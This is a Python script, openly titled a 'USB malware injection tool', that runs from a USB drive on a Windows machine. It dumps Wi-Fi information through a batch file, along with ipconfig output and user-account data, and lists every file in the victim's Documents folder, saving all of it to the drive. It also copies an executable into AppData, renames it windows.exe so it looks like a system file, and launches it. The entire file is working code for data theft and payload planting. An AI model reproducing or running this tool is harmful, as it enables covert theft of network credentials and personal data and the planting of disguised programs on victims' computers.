"""********************************** PROGRAM OWNERSHEIP *******************************************
                          USB MALWARE INJECTION TOOL
       Designer and Creater : Natnael Alem
       Code : Python
       github: https://github.com/NH-web
       instagram : @9h0st_z
************************************* OPEN-SOURCE TOOL *******************************************
"""

import os
import sys
import socket
import time
import shutil
import webbrowser
import subprocess

drivelist = ["D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

def finddrive():
    for i in drivelist:
	# you need to create directory called copies in your usb
        if os.path.exists("{}:/copies".format(i)):
            start(i)
        else:
            pass
    #elif os.path.exists("
def start(drive):

    os.system("cp {}:/wifi3.bat C:/Users/{}/appdata/".format(drive,os.getlogin()))
    os.system("C:/Users/{}/appdata/wifi3.bat > C:/Users/{}/Desktop/wifi_info.csv".format(os.getlogin(),os.getlogin()))
    os.system("mv C:/Users/{}/Desktop/wifi_info.csv {}:/".format(os.getlogin(),drive))
    os.system("ipconfig > address.csv")

    os.system("mv address.csv {}:/".format(drive))
    #os.system("mv C:/Users/{}/Desktop/wifi_info.csv {}:/".format(os.getlogin(),drive))
    os.system("rm C:/Users/{}/appdata/wifi3.bat".format(os.getlogin()))
    if os.path.exists("C:/Users/{}/appdata/windows.exe".format(os.getlogin())):
        subprocess.run("start C:/Users/{}/appdata/windows.exe".format(os.getlogin()),shell=True)
    else:
        subprocess.run("cp {}:/client.exe C:/Users/{}/appdata/windows.exe".format(drive,os.getlogin()),shell=True)
        subprocess.run("start C:/Users/{}/appdata/windows.exe".format(os.getlogin()),shell=True)
    #os.system("C:/users/{}/appdata/client.exe".format(os.getlogin()))
    #os.system("cp E:/admin.exe C:/Users/{}/appdata/".format(os.getlogin()))
    #os.system("C:/Users/{}/appdata/admin.exe")
    os.system("wmic USERACCOUNT > infos.csv")
    os.system("mv infos.csv {}:/".format(drive))
    path = "C:/Users/{}/Documents".format(os.getlogin())
    filename = []
    for root, dirs, files in os.walk(path):
        for file in files:
            filename.append(os.path.join(root,file))

    for name in filename:
        with open("files_list.csv","a") as e:
            e.write(name + "\n")
        #if you want you can enable this to copy the whole file in the path
	#os.system("cp '{}' E:/copies/".format(name))
        #e.close()
        #os.system("mv files_list.txt E:/")
        #except Exception as e:
        #    print (e)
    os.system("mv files_list.csv {}:/".format(drive))
    #start a program to know when it's done coping
    webbrowser.open("tel:anonymous")

finddrive()
